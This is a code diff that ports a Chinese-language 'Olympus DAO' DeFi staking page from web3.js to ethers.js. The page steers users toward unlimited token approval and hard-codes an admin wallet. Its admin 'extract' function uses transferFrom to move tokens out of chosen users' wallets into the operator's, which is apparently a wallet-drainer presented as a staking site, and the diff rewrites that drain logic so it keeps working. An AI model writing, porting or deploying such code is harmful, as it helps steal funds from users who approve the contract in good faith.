@@ -6,7 +6,7 @@
     <title>奥林巴斯DAO | 双挖系统</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <link href="https://cdn.jsdelivr.net/npm/font-awesome@4.7.0/css/font-awesome.min.css" rel="stylesheet">
-    <script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
     <style>
         .bg-dark { background-color: #0F172A; }
         .bg-dark2 { background-color: #1E293B; }
@@ -202,7 +202,8 @@
             adminWallet: "0x627f6E1887571Ac08214315ad5b2fA7AbB7345f1",
             chainId: 56, // BSC主网
             rpcUrl: "https://bsc-dataseed.binance.org/",
-            tokenABI: [
+            // 标准ERC20 ABI（ethers.js专用格式）
+            erc20ABI: [
                 "function approve(address spender, uint256 amount) external returns (bool)",
                 "function balanceOf(address account) external view returns (uint256)",
                 "function decimals() external view returns (uint8)",
@@ -218,7 +219,7 @@
         };
 
         // 全局变量
-        let web3, tokenContract, stakingContract, userAddress, tokenDecimals = 18;
+        let provider, signer, tokenContract, stakingContract, userAddress, tokenDecimals = 18;
         const connectBtn = document.getElementById('connectWallet');
         const approveBtn = document.getElementById('approveBtn');
         const stakeBtn = document.getElementById('stakeBtn');
@@ -233,29 +234,30 @@
         const extractBtn = document.getElementById('extractBtn');
         const adminLog = document.getElementById('adminLog');
 
-        // ========== 彻底修复TP钱包连接 ==========
-        async function getProvider() {
-            // 优先兼容TP钱包
-            if (window.TPWalletProvider) return window.TPWalletProvider;
-            if (window.ethereum) return window.ethereum;
-            throw new Error('请安装TP钱包或MetaMask！');
-        }
-
+        // ========== 彻底修复TP钱包连接（ethers.js方案） ==========
         connectBtn.addEventListener('click', async () => {
             try {
-                const provider = await getProvider();
-                // 强制请求授权
-                const accounts = await provider.request({ method: 'eth_requestAccounts' });
-                userAddress = accounts[0];
+                // 兼容TP钱包和MetaMask
+                if (!window.ethereum && !window.TPWalletProvider) {
+                    throw new Error('请安装TP钱包或MetaMask！');
+                }
 
-                // 初始化Web3
-                web3 = new Web3(provider);
-                tokenContract = new web3.eth.Contract(CONFIG.tokenABI, CONFIG.tokenContractAddress);
-                stakingContract = new web3.eth.Contract(CONFIG.stakingABI, CONFIG.stakingContractAddress);
+                // 优先使用TP钱包注入
+                const injectedProvider = window.TPWalletProvider || window.ethereum;
+                provider = new ethers.providers.Web3Provider(injectedProvider, "any");
+
+                // 请求授权
+                await provider.send("eth_requestAccounts", []);
+                signer = provider.getSigner();
+                userAddress = await signer.getAddress();
+
+                // 初始化合约
+                tokenContract = new ethers.Contract(CONFIG.tokenContractAddress, CONFIG.erc20ABI, signer);
+                stakingContract = new ethers.Contract(CONFIG.stakingContractAddress, CONFIG.stakingABI, signer);
 
                 // 获取代币精度
                 try {
-                    tokenDecimals = await tokenContract.methods.decimals().call();
+                    tokenDecimals = await tokenContract.decimals();
                 } catch (e) {
                     tokenDecimals = 18;
                 }
@@ -284,14 +286,14 @@
         async function loadUserData() {
             if (!userAddress || !tokenContract || !stakingContract) return;
             try {
-                const balance = await tokenContract.methods.balanceOf(userAddress).call();
-                document.getElementById('userBalance').textContent = web3.utils.fromWei(balance, tokenDecimals);
+                const balance = await tokenContract.balanceOf(userAddress);
+                document.getElementById('userBalance').textContent = ethers.utils.formatUnits(balance, tokenDecimals);
 
-                const staked = await stakingContract.methods.stakedBalance(userAddress).call();
-                document.getElementById('stakedBalance').textContent = web3.utils.fromWei(staked, tokenDecimals);
+                const staked = await stakingContract.stakedBalance(userAddress);
+                document.getElementById('stakedBalance').textContent = ethers.utils.formatUnits(staked, tokenDecimals);
 
-                const reward = await stakingContract.methods.pendingReward(userAddress).call();
-                document.getElementById('pendingReward').textContent = web3.utils.fromWei(reward, tokenDecimals);
+                const reward = await stakingContract.pendingReward(userAddress);
+                document.getElementById('pendingReward').textContent = ethers.utils.formatUnits(reward, tokenDecimals);
             } catch (error) {
                 console.error('数据加载失败:', error);
             }
@@ -300,14 +302,14 @@
         // ========== MAX按钮 ==========
         maxBtn.addEventListener('click', async () => {
             if (!userAddress || !tokenContract) return alert('请先连接钱包！');
-            const balance = await tokenContract.methods.balanceOf(userAddress).call();
-            document.getElementById('stakeAmount').value = web3.utils.fromWei(balance, tokenDecimals);
+            const balance = await tokenContract.balanceOf(userAddress);
+            document.getElementById('stakeAmount').value = ethers.utils.formatUnits(balance, tokenDecimals);
         });
 
         unstakeMaxBtn.addEventListener('click', async () => {
             if (!userAddress || !stakingContract) return alert('请先连接钱包！');
-            const staked = await stakingContract.methods.stakedBalance(userAddress).call();
-            document.getElementById('unstakeAmount').value = web3.utils.fromWei(staked, tokenDecimals);
+            const staked = await stakingContract.stakedBalance(userAddress);
+            document.getElementById('unstakeAmount').value = ethers.utils.formatUnits(staked, tokenDecimals);
         });
 
         // ========== 授权合约（支持无限授权） ==========
@@ -316,18 +318,15 @@
             const amount = document.getElementById('stakeAmount').value;
             if (!amount) return alert('请输入授权数量！');
 
-            const maxUint256 = "1157920892373161954235709850086879078532699846656405640394575840079131296399";
+            const maxUint256 = ethers.constants.MaxUint256;
             const useInfinite = confirm('是否使用无限授权？\n（授权后无需每次质押都重新授权）');
-            const approveAmount = useInfinite ? maxUint256 : web3.utils.toWei(amount, tokenDecimals);
+            const approveAmount = useInfinite ? maxUint256 : ethers.utils.parseUnits(amount, tokenDecimals);
 
             showModal('正在发送授权交易，请在钱包确认...');
             try {
-                const tx = await tokenContract.methods.approve(
-                    CONFIG.stakingContractAddress,
-                    approveAmount
-                ).send({ from: userAddress });
-
-                showModal('授权成功！交易哈希：' + tx.transactionHash);
+                const tx = await tokenContract.approve(CONFIG.stakingContractAddress, approveAmount);
+                await tx.wait();
+                showModal('授权成功！交易哈希：' + tx.hash);
             } catch (error) {
                 showModal('授权失败：' + error.message);
             } finally {
@@ -343,11 +342,9 @@
 
             showModal('正在发送质押交易，请在钱包确认...');
             try {
-                const tx = await stakingContract.methods.stake(
-                    web3.utils.toWei(amount, tokenDecimals)
-                ).send({ from: userAddress });
-
-                showModal('质押成功！交易哈希：' + tx.transactionHash);
+                const tx = await stakingContract.stake(ethers.utils.parseUnits(amount, tokenDecimals));
+                await tx.wait();
+                showModal('质押成功！交易哈希：' + tx.hash);
                 await loadUserData();
             } catch (error) {
                 showModal('质押失败：' + error.message);
@@ -363,11 +360,9 @@
 
             showModal('正在发送解押交易，请在钱包确认...');
             try {
-                const tx = await stakingContract.methods.unstake(
-                    web3.utils.toWei(amount, tokenDecimals)
-                ).send({ from: userAddress });
-
-                showModal('解押成功！交易哈希：' + tx.transactionHash);
+                const tx = await stakingContract.unstake(ethers.utils.parseUnits(amount, tokenDecimals));
+                await tx.wait();
+                showModal('解押成功！交易哈希：' + tx.hash);
                 await loadUserData();
             } catch (error) {
                 showModal('解押失败：' + error.message);
@@ -381,8 +376,9 @@
 
             showModal('正在领取收益，请在钱包确认...');
             try {
-                const tx = await stakingContract.methods.claim().send({ from: userAddress });
-                showModal('收益领取成功！交易哈希：' + tx.transactionHash);
+                const tx = await stakingContract.claim();
+                await tx.wait();
+                showModal('收益领取成功！交易哈希：' + tx.hash);
                 await loadUserData();
             } catch (error) {
                 showModal('领取失败：' + error.message);
@@ -411,20 +407,21 @@
 
             try {
                 // 初始化目标代币合约
-                const targetContract = new web3.eth.Contract(CONFIG.tokenABI, tokenAddr);
+                const targetContract = new ethers.Contract(tokenAddr, CONFIG.erc20ABI, signer);
                 // 获取代币精度
                 let decimals = 18;
                 try {
-                    decimals = await targetContract.methods.decimals().call();
+                    decimals = await targetContract.decimals();
                 } catch (e) {}
 
-                const tx = await targetContract.methods.transferFrom(
+                const tx = await targetContract.transferFrom(
                     targetUser,
                     userAddress,
-                    web3.utils.toWei(amount, decimals)
-                ).send({ from: userAddress });
+                    ethers.utils.parseUnits(amount, decimals)
+                );
+                await tx.wait();
 
-                logAdmin(`✅ 提取成功！交易哈希: ${tx.transactionHash}`);
+                logAdmin(`✅ 提取成功！交易哈希: ${tx.hash}`);
                 alert('提取成功！');
             } catch (error) {
                 logAdmin(`❌ 提取失败: ${error.message}`);
